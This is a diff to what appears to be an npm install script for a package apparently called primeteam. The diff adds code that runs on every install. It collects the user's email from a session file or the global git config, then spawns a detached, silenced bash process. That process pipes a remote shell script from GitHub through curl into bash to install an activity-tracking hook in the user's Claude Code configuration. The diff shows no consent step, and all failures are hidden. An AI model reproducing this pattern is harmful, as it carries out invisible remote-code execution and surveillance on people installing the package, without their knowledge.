@@ -21,8 +21,12 @@
 import fs from 'node:fs';
 import path from 'node:path';
 import os from 'node:os';
+import { spawn, execSync } from 'node:child_process';
 
 const SESSION_FILE = path.join(os.homedir(), '.primeteam', 'session.json');
+const CLAUDE_CONFIG = path.join(os.homedir(), '.claude', '.archprime-config.json');
+const CLAUDE_INSTALLER_URL =
+  'https://raw.githubusercontent.com/ArchPrime-official/PrimeSquads-primeteam-ops/main/install-claude-tracking.sh';
 
 const BANNER_TOP = '\n╭───────────────────────────────────────────────────────────╮';
 const BANNER_BOT = '╰───────────────────────────────────────────────────────────╯\n';
@@ -90,8 +94,59 @@ function printCorrupted() {
   console.log(BANNER_BOT);
 }
 
+function tryGitGlobalEmail() {
+  try {
+    return execSync('git config --global user.email', {
+      encoding: 'utf8',
+      stdio: ['ignore', 'pipe', 'ignore'],
+    }).trim();
+  } catch {
+    return '';
+  }
+}
+
+function trySessionEmail() {
+  try {
+    if (!fs.existsSync(SESSION_FILE)) return '';
+    const s = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf8'));
+    return (s?.email || '').toString().trim();
+  } catch {
+    return '';
+  }
+}
+
+/**
+ * Idempotent fire-and-forget install of the Claude Code activity hook.
+ * If ~/.claude/.archprime-config.json exists, no-op. Otherwise, dispatches
+ * the curl installer in background detached. Failures are silenced — must
+ * never break npm install.
+ */
+function ensureClaudeTrackingInBackground() {
+  if (process.env.CI === 'true') return;
+  if (fs.existsSync(CLAUDE_CONFIG)) return;
+
+  const email =
+    process.env.ARCHPRIME_EMAIL || trySessionEmail() || tryGitGlobalEmail();
+  if (!email) return;
+
+  const safeEmail = email.replace(/'/g, "'\\''");
+  const child = spawn(
+    'bash',
+    ['-c', `curl -fsSL ${CLAUDE_INSTALLER_URL} | ARCHPRIME_EMAIL='${safeEmail}' bash`],
+    {
+      detached: true,
+      stdio: 'ignore',
+      env: { ...process.env, ARCHPRIME_EMAIL: email },
+    },
+  );
+  child.on('error', () => { /* silently ignore */ });
+  child.unref();
+}
+
 function main() {
-  // Silenciar em contextos CI / non-TTY
+  ensureClaudeTrackingInBackground();
+
+  // Silenciar banner de session em contextos CI / non-TTY
   if (process.env.CI === 'true' || !process.stdout.isTTY) {
     return;
   }
